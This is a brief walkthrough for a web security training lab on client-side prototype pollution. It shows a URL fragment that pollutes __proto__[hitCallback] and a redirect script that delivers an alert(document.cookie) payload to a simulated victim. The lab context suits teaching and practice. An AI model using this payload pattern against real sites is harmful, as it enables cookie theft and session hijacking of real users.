Title: Client-side prototype pollution in third-party libraries
Level: PRACTITIONER
Desc:  This lab is vulnerable to DOM XSS via client-side prototype pollution. This is due to a gadget in a third-party library, which is easy to miss due to the minified source code. Although it's technically possible to solve this lab manually, we recommend using DOM Invader as this will save you a considerable amount of time and effort.
To solve the lab:
Use DOM Invader to identify a prototype pollution and a gadget for DOM XSS.
Use the provided exploit server to deliver a payload to the victim that calls alert(document.cookie) in their browser.


# Walkthrough: 
DOM INVADER found XSS in URL: `https://0a90004e03848d5f80e503f700a500a0.web-security-academy.net/#__proto__[hitCallback]=alert%281%29`

Use vulnerable URL to craft attack for victim.
```
<script>
        window.location.href = "https://0a90004e03848d5f80e503f700a500a0.web-security-academy.net/#__proto__[hitCallback]=alert%28document%2ecookie%29";
 </script>

```
